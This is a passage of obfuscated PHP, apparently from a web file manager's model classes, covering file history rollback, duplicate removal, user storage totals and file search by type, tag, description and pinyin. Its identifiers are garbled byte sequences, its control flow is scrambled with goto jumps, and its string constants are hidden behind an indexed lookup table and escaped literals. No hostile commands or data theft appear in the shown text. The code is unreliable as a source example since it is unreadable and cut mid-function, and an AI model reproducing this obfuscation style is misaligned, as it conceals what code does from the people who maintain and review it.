array_to_keyvalue($aÙÍèÔËöÂ, $E∫ÂÕ’á›ô[33], $E∫ÂÕ’á›ô[461]); Model($E∫ÂÕ’á›ô[464])->remove($e”≈Éÿ¢ú™); } goto Dçﬂ„íéé∫; e≤ãç÷ÍëÇ: $E∫ÂÕ’á›ô =& $_SERVER[’ÿƒ†ïò]; if (!$Cô¢Ïﬁîœâ) { return !1; } if (!is_array($Cô¢Ïﬁîœâ)) { $Cô¢Ïﬁîœâ = array($Cô¢Ïﬁîœâ); } goto A€µµúô≈π; f≤±âˆ«îî: } public function setDetail($Cò…ΩÓ£›≤, $FÕ∫ê◊ºµâ) { $eœ‰∏ëè°• =& $_SERVER[’ÿƒ†ïò]; return $this->where(array($eœ‰∏ëè°•[414] => $Cò…ΩÓ£›≤))->save(array($eœ‰∏ëè°•[1957] => $FÕ∫ê◊ºµâ)); } public function rollbackToItem($D∆åıãïÖ¶, $F“«å∫™«Ç) { goto fœï≥ü•Ù⁄; bÏÊë∆Ëœ”: return $this->where(array($a≠¶‰á⁄≠ˆ[414] => $F“«å∫™«Ç))->delete(); goto cŒÀåó¡Ã§; EÿùõªÍÖè: $D≥§ßÛÛ¯æ = $this->find($F“«å∫™«Ç); $Dæ£À◊Ç›ô = array($a≠¶‰á⁄≠ˆ[461] => $D≥§ßÛÛ¯æ[$a≠¶‰á⁄≠ˆ[461]], $a≠¶‰á⁄≠ˆ[78] => $D≥§ßÛÛ¯æ[$a≠¶‰á⁄≠ˆ[78]], $a≠¶‰á⁄≠ˆ[84] => time(), $a≠¶‰á⁄≠ˆ[448] => USER_ID); Model($a≠¶‰á⁄≠ˆ[820])->where(array($a≠¶‰á⁄≠ˆ[397] => $D∆åıãïÖ¶))->save($Dæ£À◊Ç›ô); goto bÏÊë∆Ëœ”; fœï≥ü•Ù⁄: $a≠¶‰á⁄≠ˆ =& $_SERVER[’ÿƒ†ïò]; $fµ≤¡•åÈ– = Model($a≠¶‰á⁄≠ˆ[820])->sourceInfo($D∆åıãïÖ¶); $this->addHistory($fµ≤¡•åÈ–, LNG($a≠¶‰á⁄≠ˆ[1968])); goto EÿùõªÍÖè; cŒÀåó¡Ã§: } public function clearSame($FÈïπ€ÜÑÆ) { goto F ‰È…«áÁ; F ‰È…«áÁ: $F•‚Íúﬂ◊∏ =& $_SERVER[’ÿƒ†ïò]; $Eé‡€ı†ç‡ = $this->listData($FÈïπ€ÜÑÆ); $dÃ±í’ó∫≥ = array_to_keyvalue_group($Eé‡€ı†ç‡, $F•‚Íúﬂ◊∏[461]); goto F¥ª£¡Ü„; aÖ£¿…ıùÖ: if (!$C∏·É´÷ø¿) { return; } $this->where(array($F•‚Íúﬂ◊∏[395] => array($F•‚Íúﬂ◊∏[7], $C∏·É´÷ø¿)))->delete(); Model($F•‚Íúﬂ◊∏[464])->remove($bµ¢©˘ºÑ); goto b™Íí§∏í…; F¥ª£¡Ü„: $bµ¢©˘ºÑ = array(); $C∏·É´÷ø¿ = array(); foreach ($dÃ±í’ó∫≥ as $d∞ ùèêä∑) { if (!$d∞ ùèêä∑ || count($d∞ ùèêä∑) <= 1) { continue; } foreach ($d∞ ùèêä∑ as $c‚˘ÀÕ«ƒÿ) { $bµ¢©˘ºÑ[] = $c‚˘ÀÕ«ƒÿ[$F•‚Íúﬂ◊∏[461]]; $C∏·É´÷ø¿[] = $c‚˘ÀÕ«ƒÿ[$F•‚Íúﬂ◊∏[395]]; } } goto aÖ£¿…ıùÖ; b™Íí§∏í…: } public function userSpace() { $C¥¡Ã“Æ≈û =& $_SERVER[’ÿƒ†ïò]; $e∞£∂”ìèé = $this->tablePrefix; $fôÕ–£ëÜ™ = array($C¥¡Ã“Æ≈û[1548] => USER_ID); $BÃåóé˜àœ = "{$e∞£∂”ìèé}\151\157\137\x66\151\154\145\40\x66\x69\154\x65\x73\x20\157\156\40\x66\x69\154\x65\163\x2e\x66\151\154\145\x49\104\x20\75\40\150\x69\163\164\157\x72\171\x2e\146\x69\x6c\x65\x49\x44"; return $this->alias($C¥¡Ã“Æ≈û[1966])->where($fôÕ–£ëÜ™)->join($BÃåóé˜àœ, $C¥¡Ã“Æ≈û[1967])->sum($C¥¡Ã“Æ≈û[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Cæ“°à•¡«) { goto a¨√ììø≈◊; a¨√ììø≈◊: $CŸ¥‘„•◊Ê =& $_SERVER[’ÿƒ†ïò]; $aﬂØ∆ó¿çÁ = KodIO::fileTypeList(); $dØÊ”úµ·Ü = $aﬂØ∆ó¿çÁ[$Cæ“°à•¡«]; goto CåãìΩ≤Ò; CåãìΩ≤Ò: if (!$dØÊ”úµ·Ü) { return array(); } $a…éûïéîÈ = $dØÊ”úµ·Ü[$CŸ¥‘„•◊Ê[168]]; $c«ﬁ∏îñ§É = $CŸ¥‘„•◊Ê[7]; goto BÎ∂µÓÎàÔ; BÎ∂µÓÎàÔ: if (!$dØÊ”úµ·Ü[$CŸ¥‘„•◊Ê[168]]) { $fã‹‘≈—™á = array_to_keyvalue($aﬂØ∆ó¿çÁ, $CŸ¥‘„•◊Ê[33], $CŸ¥‘„•◊Ê[168]); $a…éûïéîÈ = implode($CŸ¥‘„•◊Ê[47], $fã‹‘≈—™á); $c«ﬁ∏îñ§É = $CŸ¥‘„•◊Ê[1969]; } $a≠üË∑≥¢ = explode($CŸ¥‘„•◊Ê[47], trim($a…éûïéîÈ, $CŸ¥‘„•◊Ê[47])); return array($c«ﬁ∏îñ§É, $a≠üË∑≥¢); goto b›œ‡ΩÂ‰û; b›œ‡ΩÂ‰û: } public function listPathType($Cπêé…À‘É) { $c∞†ê°òœä =& $_SERVER[’ÿƒ†ïò]; $BîÀÑçÊ¡È = $this->fileTypeWhere($Cπêé…À‘É); if (!$BîÀÑçÊ¡È) { return array(); } $cµµ„¿˘—µ = array($c∞†ê°òœä[574] => SourceModel::TYPE_USER, $c∞†ê°òœä[575] => USER_ID, $c∞†ê°òœä[571] => 0, $c∞†ê°òœä[572] => $BîÀÑçÊ¡È); return $this->listSource($cµµ„¿˘—µ); } public function listSearch($bêΩ‡ÜÍ¥á, $FÏŸãÒπìñ = 300) { goto C“óÒ∫†πÿ; dïë≈ﬁ†ä≥: $this->_listSearchDesc($c∞—ä¢≤‘Æ, $bêΩ‡ÜÍ¥á, $E¨Ê™•ÜÊ£); $this->_listSearchTag($c∞—ä¢≤‘Æ, $bêΩ‡ÜÍ¥á, $E¨Ê™•ÜÊ£); $this->_listSearchGroupTag($c∞—ä¢≤‘Æ, $bêΩ‡ÜÍ¥á, $E¨Ê™•ÜÊ£); goto bÿÖÈ”⁄ú”; b¡¶≠ïÑò‚: $eòá⁄áÑäÊ = $FÎ°ƒ”æœ∏; if (!isset($FÎ°ƒ”æœ∏[$C≤Âú«‘†Œ[425]])) { $FÎ°ƒ”æœ∏[$C≤Âú«‘†Œ[425]] = 0; } $cØÇÓËˆ“‰ = $C≤Âú«‘†Œ[1971]; goto Cúô»«ÃïŸ; C“óÒ∫†πÿ: $C≤Âú«‘†Œ =& $_SERVER[’ÿƒ†ïò]; if (isset($bêΩ‡ÜÍ¥á[$C≤Âú«‘†Œ[1814]]) && $bêΩ‡ÜÍ¥á[$C≤Âú«‘†Œ[1814]]) { $bêΩ‡ÜÍ¥á[$C≤Âú«‘†Œ[1814]] = str_replace($C≤Âú«‘†Œ[382], $C≤Âú«‘†Œ[1970], trim($bêΩ‡ÜÍ¥á[$C≤Âú«‘†Œ[1814]])); } $FÎ°ƒ”æœ∏ = $this->_parseSearchWhere($bêΩ‡ÜÍ¥á); goto b¡¶≠ïÑò‚; Cúô»«ÃïŸ: $E¨Ê™•ÜÊ£ = $cØÇÓËˆ“‰; $this->_listSearchBindPinyin($bêΩ‡ÜÍ¥á, $FÎ°ƒ”æœ∏, $cØÇÓËˆ“‰); $this->alias($C≤Âú«‘†Œ[438])->_makeOrder(); goto báÉçÜíÊ¯; bÿÖÈ”⁄ú”: $this->_listDataApply($c∞—ä¢≤‘Æ[$C≤Âú«‘†Œ[367]]); $this->_listMake($c∞—ä¢≤‘Æ); return $c∞—ä¢≤‘Æ; goto d‰Ç–©æ€—; báÉçÜíÊ¯: $FÎ°ƒ”æœ∏ = $this->parseWhereLike($FÎ°ƒ”æœ∏); $c∞—ä¢≤‘Æ = $this->distinct(!0)->field($cØÇÓËˆ“‰)->where($FÎ°ƒ”æœ∏)->selectPage($FÏŸãÒπìñ); $this->_listSearchFileContent($c∞—ä¢≤‘Æ, $bêΩ‡ÜÍ¥á, $E¨Ê™•ÜÊ£, $eòá⁄áÑäÊ); goto dïë≈ﬁ†ä≥; d‰Ç–©æ€—: } private function _listSearchFileContent(&$Aƒ‰œ‚¨å™, $F«èë∞‹Ñ§, $Eå¥¨çëçå, $Dº¶Éˆ‰›ö) { goto Aí˜ÙÎä…ı; Døêı∆œ€ä: $Aƒ‰œ‚¨å™[$dΩŸƒ⁄ÙÆ’[364]][$dΩŸƒ⁄ÙÆ’[365]] += count($d√ª∏Ω€™ï); goto aŒﬂΩÁ…ˆÚ; d¬ô±åßûﬁ: $Dº¶Éˆ‰›ö[$dΩŸƒ⁄ÙÆ’[461]] = array($dΩŸƒ⁄ÙÆ’[7], $F«èë∞‹Ñ§[$dΩŸƒ⁄ÙÆ’[461]]); unset($Dº¶Éˆ‰›ö[$dΩŸƒ⁄ÙÆ’[28]]); unset($F«èë∞‹Ñ§[$dΩŸƒ⁄ÙÆ’[461]]); goto Eú¢æä´î≈; Aí˜ÙÎä…ı: $dΩŸƒ⁄ÙÆ’ =& $_SERVER[’ÿƒ†ïò]; if (!$F«èë∞‹Ñ§[$dΩŸƒ⁄ÙÆ’[1814]] || $Aƒ‰œ‚¨å™[$dΩŸƒ⁄ÙÆ’[364]][$dΩŸƒ⁄ÙÆ’[351]] > 1) { return; } if (!isset($Dº¶Éˆ‰›ö[$dΩŸƒ⁄ÙÆ’[28]]) || !is_array($F«èë∞‹Ñ§[$dΩŸƒ⁄ÙÆ’[461]])) { return; } goto d¬ô±åßûﬁ; Eú¢æä´î≈: $d√ª∏Ω€™ï = $this->field($Eå¥¨çëçå)->where($Dº¶Éˆ‰›ö)->limit($dΩŸƒ⁄ÙÆ’[1972])->select(); if (!$d√ª∏Ω€™ï || count($d√ª∏Ω€™ï) == 0) { return; } $Aƒ‰œ‚¨å™[$dΩŸƒ⁄ÙÆ’[367]] = array_merge($d√ª∏Ω€™ï, $Aƒ‰œ‚¨å™[$dΩŸƒ⁄ÙÆ’[367]]); goto Døêı∆œ€ä; aŒﬂΩÁ…ˆÚ: } private function _listSearchTag(&$BÛÉ±∏πÁº, $BÆ‘≥ÒÃàÎ, $aç≤çõ“º⁄) { goto cΩ§êƒµ‘ù; Aö‘Âû≈†ü: $e•∞¶µ∑›¢ = array(); $b≥Òñ£Üá = $BÆ‘≥ÒÃàÎ[$B¿éﬂ“ÏñÕ[1814]]; foreach ($C´Ñè∫œŸ© as $B¨Áﬁ∏¶ô”) { $fÜèãçÌéÜ = $B¨Áﬁ∏¶ô”[$B¿éﬂ“ÏñÕ[28]]; $BÂºäúµ•∑ = str_replace($B¿éﬂ“ÏñÕ[50], $B¿éﬂ“ÏñÕ[33], Pinyin::get($fÜèãçÌéÜ)); if (stripos($fÜèãçÌéÜ, $b≥Òñ£Üá) !== !1 || stripos($BÂºäúµ•∑, $b≥Òñ£Üá) !== !1) { $e•∞¶µ∑›¢[] = $B¨Áﬁ∏¶ô”[$B¿éﬂ“ÏñÕ[395]]; } } goto C≤≈âØïË´; C≤≈âØïË´: if (!$e•∞¶µ∑›¢) { return; } $F‹ËÕ–”˘“ = array($B¿éﬂ“ÏñÕ[421] => array($B¿éﬂ“ÏñÕ[7], $e•∞¶µ∑›¢), $B¿éﬂ“ÏñÕ[1557] => USER_ID); $B®Øä⁄î¯Ë = Model($B¿éﬂ“ÏñÕ[422])->field($B¿éﬂ“ÏñÕ[76])->where($F‹ËÕ–”˘“)->select(); goto cπÓÆ‚„ßÚ; cπÓÆ‚„ßÚ: $B®Øä⁄î¯Ë = array_to_keyvalue($B®Øä⁄î¯Ë, $B¿éﬂ“ÏñÕ[33], $B¿éﬂ“ÏñÕ[76]); $eå†√§õ¥ì = array_unique($B®Øä⁄î¯Ë); $this->_listSearchMerge($BÛÉ±∏πÁº, $BÆ‘≥ÒÃàÎ, $aç≤çõ“º⁄, $eå†√§õ¥ì); goto aÑ∂≈§‡«“; cΩ§êƒµ‘ù: $B¿éﬂ“ÏñÕ =& $_SERVER[’ÿƒ†ïò]; if (!$BÆ‘≥ÒÃàÎ[$B¿éﬂ“ÏñÕ[1814]] || $BÛÉ±∏πÁº[$B¿éﬂ“ÏñÕ[364]][$B¿éﬂ“ÏñÕ[351]] > 1) { return; } $C´Ñè∫œŸ© = Model($B¿éﬂ“ÏñÕ[1973])->listData(); goto Aö‘Âû≈†ü; aÑ∂≈§‡«“: } private function _listSearchDesc(&$E©◊ﬁŒº¿ƒ, $B‰¬ú¨àÁØ, $f•ÜêÈÚÚú) { goto e…ñÓÜê¬Ñ; e…ñÓÜê¬Ñ: $Fç…ËÈÁª° =& $_SERVER[’ÿƒ†ïò]; if (!$B‰¬ú¨àÁØ[$Fç…ËÈÁª°[1814]] || $E©◊ﬁŒº¿ƒ[$Fç…ËÈÁª°[364]][$Fç…ËÈÁª°[351]] > 1) { return; } $E≤˘«”åŒÀ = $this->listSearchChildren($B‰¬ú¨àÁØ[$Fç…ËÈÁª°[492]]); goto a¥è∏â⁄œá; a¥è∏â⁄œá: $E≤˘«”åŒÀ = array_unique($E≤˘«”åŒÀ); if (!$E≤˘«”åŒÀ) { return; } $Aö—„ËÈô‘ = array($Fç…ËÈÁª°[397] => array($Fç…ËÈÁª°[7], $E≤˘«”åŒÀ), $Fç…ËÈÁª°[93] => $Fç…ËÈÁª°[445], $Fç…ËÈÁª°[372] => array($Fç…ËÈÁª°[381], $Fç…ËÈÁª°[1816] . $B‰¬ú¨àÁØ[$Fç…ËÈÁª°[1814]] . $Fç…ËÈÁª°[1816])); goto DÀœ≈ ˆÆﬁ; DÀœ≈ ˆÆﬁ: $C¡å∑ªßÑπ = Model($Fç…ËÈÁª°[557])->field($Fç…ËÈÁª°[397])->where($Aö—„ËÈô‘)->select(); $Eä¬ﬂÿí∆æ = array_to_keyvalue($C¡å∑ªßÑπ, $Fç…ËÈÁª°[33], $Fç…ËÈÁª°[397]); $this->_listSearchMerge($E©◊ﬁŒº¿ƒ, $B‰¬ú¨àÁØ, $f•ÜêÈÚÚú, $Eä¬ﬂÿí∆æ); goto bÑ√Æâ¡‰; bÑ√Æâ¡‰: } private function _listSearchGroupTag(&$C—úÓä¬›æ, $b”ÉÃåñ˘», $Bî™ã»õ¶¡) { goto c÷ï∏»¡ÏÔ; FÖÿæ≥ØÆÏ: $c“Ùàä÷µã = array_to_keyvalue($c“Ùàä÷µã, $d£äâãóûÜ[33], $d£äâãóûÜ[76]); $C∫¢üàú ∑ = array_unique($c“Ùàä÷µã); $this->_listSearchMerge($C—úÓä¬›æ, $b”ÉÃåñ˘», $Bî™ã»õ¶¡, $C∫¢üàú ∑); goto Dûÿ∆Ω¥¡è; E†‰∏⁄Œ’ı: $Bäê°õúñŒ = array(); $fç“ÑÉ˜“ñ = $b”ÉÃåñ˘»[$d£äâãóûÜ[1814]]; foreach ($DﬁÑÔ®ƒª◊[$d£äâãóûÜ[367]] as $d å≈”íÿµ) { $a’›íØàÎ¨ = $d å≈”íÿµ[$d£äâãóûÜ[28]]; $d∆ΩË±«—÷ = str_replace($d£äâãóûÜ[50], $d£äâãóûÜ[33], Pinyin::get($a’›íØàÎ¨)); if (stripos($a’›íØàÎ¨, $fç“ÑÉ˜“ñ) !== !1 || stripos($d∆ΩË±«—÷, $fç“ÑÉ˜“ñ) !== !1) { $Bäê°õúñŒ[] = $d å≈”íÿµ[$d£äâãóûÜ[395]]; } } goto DÚÿ¨©éª¿; A†û™ÿµ–Ó: if (!$A»¬Ç±ﬁÃ£ || $A»¬Ç±ﬁÃ£[$d£äâãóûÜ[406]] != SourceModel::TYPE_GROUP) { return; } $b—‚ò€˘∑Ï = $A»¬Ç±ﬁÃ£[$d£äâãóûÜ[498]]; $DﬁÑÔ®ƒª◊ = Model($d£äâãóûÜ[1974])->get($b—‚ò€˘∑Ï); goto E†‰∏⁄Œ’ı; DÚÿ¨©éª¿: if (!$Bäê°õúñŒ) { return; } $C≠ú√Á√£± = array($d£äâãóûÜ[421] => array($d£äâãóûÜ[7], $Bäê°õúñŒ), $d£äâãóûÜ[1557] => 0, $d£äâãóûÜ[29] => $d£äâãóûÜ[1838] . $b—‚ò€˘∑Ï); $c“Ùàä÷µã = Model($d£äâãóûÜ[422])->field($d£äâãóûÜ[76])->where($C≠ú√Á√£±)->select(); goto FÖÿæ≥ØÆÏ; c÷ï∏»¡ÏÔ: $d£äâãóûÜ =& $_SERVER[’ÿƒ†ïò]; if (!$b”ÉÃåñ˘»[$d£äâãóûÜ[1814]] || $C—úÓä¬›æ[$d£äâãóûÜ[364]][$d£äâãóûÜ[351]] > 1 || !$b”ÉÃåñ˘»[$d£äâãóûÜ[492]]) { return; } $A»¬Ç±ﬁÃ£ = $this->sourceInfo($b”ÉÃåñ˘»[$d£äâãóûÜ[492]]); goto A†û™ÿµ–Ó; Dûÿ∆Ω¥¡è: } private function _listSearchMerge(&$fà≠”ë˘„Í, $fÃÈÛïé°¡, $bó’òÑ’¯—, $AØÏ°∞°ãã) { goto cã⁄§ùÜ∑“; a∫Úƒ‹Ïπ√: foreach ($b∏µûüÁ‚Ω as $A‚·∏Û’ÁÉ) { if ($this->_listSearchFilter($A‚·∏Û’ÁÉ, $fÃÈÛïé°¡)) { $b«áå÷«¿Ø[] = $A‚·∏Û’ÁÉ; } } $fà≠”ë˘„Í[$a£‹öË⁄êõ[367]] = array_merge($b«áå÷«¿Ø, $fà≠”ë˘„Í[$a£‹öË⁄êõ[367]]); $fà≠”ë˘„Í[$a£‹öË⁄êõ[364]][$a£‹öË⁄êõ[365]] += count($b«áå÷«¿Ø); goto eôâ•–„¥ó; câÈÿÚ€ ™: $CôÉß›äœ∏ = array_diff($AØÏ°∞°ãã, $Aà√ó‘Ëêÿ); if (!$CôÉß›äœ∏) { return; } $CˆÈ¢ï»«ﬁ = array($a£‹öË⁄êõ[397] => array($a£‹öË⁄êõ[7], $CôÉß›äœ∏)); goto eÑ‚¯ò≥åΩ; eÑ‚¯ò≥åΩ: $b∏µûüÁ‚Ω = $this->field($bó’òÑ’¯—)->where($CˆÈ¢ï»«ﬁ)->select(); if (!$b∏µûüÁ‚Ω) { return; } $b«áå÷«¿Ø = array(); goto a∫Úƒ‹Ïπ√; cã⁄§ùÜ∑“: $a£‹öË⁄êõ =& $_SERVER[’ÿƒ†ïò]; if (!$AØÏ°∞°ãã) { return; } $Aà√ó‘Ëêÿ = array_to_keyvalue($fà≠”ë˘„Í[$a£‹öË⁄êõ[367]], $a£‹öË⁄êõ[33], $a£‹öË⁄êõ[397]); goto câÈÿÚ€ ™; eôâ•–„¥ó: } private function _listSearchFilter($eèÕ™Ô∏Âó, $CﬁÚ§ÊÙñç) { goto EÔ∫›È÷˜á; EÔ∫›È÷˜á: $F©‹¡ñ¡ü∆ =& $_SERVER[’ÿƒ†ïò]; $fπÇóı⁄ÃÁ = $eèÕ™Ô∏Âó[$F©‹¡ñ¡ü∆[405]] == $F©‹¡ñ¡ü∆[87]; if (!strstr($eèÕ™Ô∏Âó[$F©‹¡ñ¡ü∆[515]], $F©‹¡ñ¡ü∆[47] . $CﬁÚ§ÊÙñç[$F©‹¡ñ¡ü∆[492]] . $F©‹¡ñ¡ü∆[47])) { return !1; } goto bÜ©◊ªË°ä; añ‘àı≥ŸÕ: if (isset($CﬁÚ§ÊÙñç[$F©‹¡ñ¡ü∆[588]]) && $CﬁÚ§ÊÙñç[$F©‹¡ñ¡ü∆[588]] != $eèÕ™Ô∏Âó[$F©‹¡ñ¡ü∆[448]]) { return !1; } return !0; goto Eâ¿ô∑´∆©; bÜ©◊ªË°ä: if (isset($CﬁÚ§ÊÙñç[$F©‹¡ñ¡ü∆[407]]) && $CﬁÚ§ÊÙñç[$F©‹¡ñ¡ü∆[407]] != $F©‹¡ñ¡ü∆[1780]) { if ($CﬁÚ§ÊÙñç[$F©‹¡ñ¡ü∆[407]] == $F©‹¡ñ¡ü∆[77] && !$fπÇóı⁄ÃÁ) { return !1; } if ($CﬁÚ§ÊÙñç[$F©‹¡ñ¡ü∆[407]] != $F©‹¡ñ¡ü∆[77] && $fπÇóı⁄ÃÁ) { return !1; } if (!strstr($eèÕ™Ô∏Âó[$F©‹¡ñ¡ü∆[168]], $F©‹¡ñ¡ü∆[47] . $CﬁÚ§ÊÙñç[$F©‹¡ñ¡ü∆[407]] . $F©‹¡ñ¡ü∆[47])) { return !1; } } if (isset($CﬁÚ§ÊÙñç[$F©‹¡ñ¡ü∆[1975]]) && $CﬁÚ§ÊÙñç[$F©‹¡ñ¡ü∆[1975]] < $eèÕ™Ô∏Âó[$F©‹¡ñ¡ü∆[78]]) { return !1; } if (isset($CﬁÚ§ÊÙñç[$F©‹¡ñ¡ü∆[1976]]) && $CﬁÚ§ÊÙñç[$F©‹¡ñ¡ü∆[1976]] > $eèÕ™Ô∏Âó[$F©‹¡ñ¡ü∆[78]]) { return !1; } goto añ‘àı≥ŸÕ; Eâ¿ô∑´∆©: } public function listSearchChildren($Fçáı‘ì«‘, $DÚªØÑ”øÂ = 5000) { goto E≈«˜á¥Éã; E≈«˜á¥Éã: $CÖÁ∏∂¬Ñ° =& $_SERVER[’ÿƒ†ïò]; $f“–∂ÜÑ¯ﬂ = array(); $f•í∆ÀÊ€É = $this->sourceInfo($Fçáı‘ì«‘); goto AÈ‘ªŒ‰ÕÉ; AÈ‘ªŒ‰ÕÉ: $fä◊¶Ÿ–¥ù = array($CÖÁ∏∂¬Ñ°[515] => array($CÖÁ∏∂¬Ñ°[381], $f•í∆ÀÊ€É[$CÖÁ∏∂¬Ñ°[515]] . $f•í∆ÀÊ€É[$CÖÁ∏∂¬Ñ°[397]] . $CÖÁ∏∂¬Ñ°[539])); $D≤âê⁄Ñﬂ± = $this->field($CÖÁ∏∂¬Ñ°[397])->cache(null, 600)->where($fä◊¶Ÿ–¥ù)->count(); if ($D≤âê⁄Ñﬂ± > $DÚªØÑ”øÂ) { return $this->_listSearchChildrenNear($Fçáı‘ì«‘, $DÚªØÑ”øÂ); } goto dÌëè∞Îß™; dÌëè∞Îß™: $b∆»Ÿ‡Éºß = $this->field($CÖÁ∏∂¬Ñ°[397])->where($fä◊¶Ÿ–¥ù)->select(); $f“–∂ÜÑ¯ﬂ = array_to_keyvalue($b∆»Ÿ‡Éºß, $CÖÁ∏∂¬Ñ°[33], $CÖÁ∏∂¬Ñ°[397]); return $f“–∂ÜÑ¯ﬂ; goto aãı›ÛÿŒ; aãı›ÛÿŒ: } private function _listSearchChildrenNear($d„∏‚ˆêôÍ, $Cé°¿ãõüÛ) { goto DÁò∂™•ñÉ; FÙ§⁄–≠ó¶: $b‹ÑàÀñ˘¡ = array_merge($b‹ÑàÀñ˘¡, array_to_keyvalue($aû¬ºè”ì∆, $EÉÛà⁄‚•ó[33], $EÉÛà⁄‚•ó[397])); $b‹ÑàÀñ˘¡ = array_slice($b‹ÑàÀñ˘¡, 0, $Cé°¿ãõüÛ); return $b‹ÑàÀñ˘¡; goto DÎóá»⁄¿µ; A∫ﬂè‰éèÏ: $aû¬ºè”ì∆ = $this->field($EÉÛà⁄‚•ó[1977])->where($A–ëä«¨–¨)->select(); $D€öÙê©ÌÎ = array_to_keyvalue(array_filter_by_field($aû¬ºè”ì∆, $EÉÛà⁄‚•ó[405], $EÉÛà⁄‚•ó[87]), $EÉÛà⁄‚•ó[33], $EÉÛà⁄‚•ó[397]); $b‹ÑàÀñ˘¡ = array_merge($b‹ÑàÀñ˘¡, array_to_keyvalue($aû¬ºè”ì∆, $EÉÛà⁄‚•ó[33], $EÉÛà⁄‚•ó[397])); goto bÍß‹≤Ô¯«; bÍß‹≤Ô¯«: if (!$D€öÙê©ÌÎ) { return $b‹ÑàÀñ˘¡; } $A–ëä«¨–¨ = array($EÉÛà⁄‚•ó[492] => array($EÉÛà⁄‚•ó[7], $D€öÙê©ÌÎ)); $aû¬ºè”ì∆ = $this->field($EÉÛà⁄‚•ó[1977])->where($A–ëä«¨–¨)->limit($Cé°¿ãõüÛ)->select(); goto FÙ§⁄–≠ó¶; DÁò∂™•ñÉ: $EÉÛà⁄‚•ó =& $_SERVER[’ÿƒ†ïò]; $b‹ÑàÀñ˘¡ = array(); $A–ëä«¨–¨ = array($EÉÛà⁄‚•ó[492] => $d„∏‚ˆêôÍ); goto A∫ﬂè‰éèÏ; DÎóá»⁄¿µ: } private function _listSearchBindPinyin($EÉÏÏ’åƒ∂, &$Eç®ÈÍ¨·¡, &$dª’Ÿ áÔ÷) { goto E€ëÓ†àÉØ; e¥µ‰ØÁÕ‚: foreach ($Eç®ÈÍ¨·¡ as $dêÔ»…Àá⁄ => $BãÁÂ∞áó¯) { $e∞°Í‡ ´[$F£ôÔÆÓÇ—[430] . $dêÔ»…Àá⁄] = $BãÁÂ∞áó¯; } foreach ($A∫¶ƒÕ≤Æõ as $D·ÆÖé”ºô) { $e∞°Í‡ ´[] = array($F£ôÔÆÓÇ—[435] => $D·ÆÖé”ºô, $F£ôÔÆÓÇ—[987] => $F£ôÔÆÓÇ—[1818], array($F£ôÔÆÓÇ—[1979] => $D·ÆÖé”ºô, $F£ôÔÆÓÇ—[1980] => array($F£ôÔÆÓÇ—[7], array($F£ôÔÆÓÇ—[458], $F£ôÔÆÓÇ—[457])))); } $this->join($bª‰’†ª¯⁄); goto DÈõä´¶Ã±; E€ëÓ†àÉØ: $F£ôÔÆÓÇ— =& $_SERVER[’ÿƒ†ïò]; if (!isset($EÉÏÏ’åƒ∂[$F£ôÔÆÓÇ—[1814]]) || !$EÉÏÏ’åƒ∂[$F£ôÔÆÓÇ—[1814]]) { return; } if (!Input::check($EÉÏÏ’åƒ∂[$F£ôÔÆÓÇ—[1814]], $F£ôÔÆÓÇ—[316]) || strlen($EÉÏÏ’åƒ∂[$F£ôÔÆÓÇ—[1814]]) < 2) { return; } goto CÿïÕΩç˜Ÿ; DÈõä´¶Ã±: $Eç®ÈÍ¨·¡ = $e∞°Í‡ ´; goto cõı–£êπ®; CÿïÕΩç˜Ÿ: $bª‰’†ª¯⁄ = "\114\105\x46\124\40\x4a\117\111\116\x20{$this->tablePrefix}\151\x6f\137\163\x6f\165\162\x63\145\137\x6d\145\164\x61\40\x6d\x65\164\141\40\x6f\156\x20\163\157\165\x72\x63\x65\56\x73\x6f\165\162\x63\145\x49\104\x20\75\x20\155\145\x74\141\56\163\157\x75\162\x63\x65\x49\104"; $e∞°Í‡ ´ = array(); $dª’Ÿ áÔ÷ = str_replace(array($F£ôÔÆÓÇ—[229], $F£ôÔÆÓÇ—[50], $F£ôÔÆÓÇ—[1978]), $F£ôÔÆÓÇ—[33], $dª’Ÿ áÔ÷); goto D⁄Øß•ÜÿÉ; D⁄Øß•ÜÿÉ: $dª’Ÿ áÔ÷ = $F£ôÔÆÓÇ—[430] . str_replace($F£ôÔÆÓÇ—[47], $F£ôÔÆÓÇ—[431], $dª’Ÿ áÔ÷); $A∫¶ƒÕ≤Æõ = $Eç®ÈÍ¨·¡[$F£ôÔÆÓÇ—[28]]; unset($Eç®ÈÍ¨·¡[$F£ôÔÆÓÇ—[28]]); goto e¥µ‰ØÁÕ‚; cõı–£êπ®: } private function _parseSearchWhere($E≈∂Ç≈⁄éÚ) { goto FÜπ∞…≈“©; C†´åê∏≥ÿ: if (isset($E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[588]]) && $E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[588]]) { $d¬õòƒ§°Ü[] = array($cûâàÖœ•Æ[448] => $E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[588]], $cûâàÖœ•Æ[446] => $E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[588]], $cûâàÖœ•Æ[987] => $cûâàÖœ•Æ[1818]); } if (isset($E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[407]]) && $E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[407]]) { $D¬úäÖ€„† = $E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[407]]; if ($D¬úäÖ€„† == $cûâàÖœ•Æ[77]) { $d¬õòƒ§°Ü[$cûâàÖœ•Æ[405]] = 1; } else { if ($D¬úäÖ€„† == $cûâàÖœ•Æ[1984]) { $d¬õòƒ§°Ü[$cûâàÖœ•Æ[405]] = 0; } else { if ($D¬úäÖ€„†) { $D¬úäÖ€„† = is_array($D¬úäÖ€„†) ? $D¬úäÖ€„† : explode($cûâàÖœ•Æ[47], $D¬úäÖ€„†); $d¬õòƒ§°Ü[$cûâàÖœ•Æ[407]] = array($cûâàÖœ•Æ[413], $D¬úäÖ€„†); $d¬õòƒ§°Ü[$cûâàÖœ•Æ[405]] = 0; } } } } $this->_parseSearchParent($E≈∂Ç≈⁄éÚ, $d¬õòƒ§°Ü); goto d’ñ´÷ùäâ; cÉΩˆÉÕ–ñ: if (isset($E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[490]]) && $E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[490]]) { $e‚Õâ’èø„ = array($cûâàÖœ•Æ[1982], $E≈∂Ç≈⁄éÚ[$cûâàÖœ•Æ[490]]); if ($d¬õòƒ§°Ü[$cûâàÖœ•Æ[84]]) { 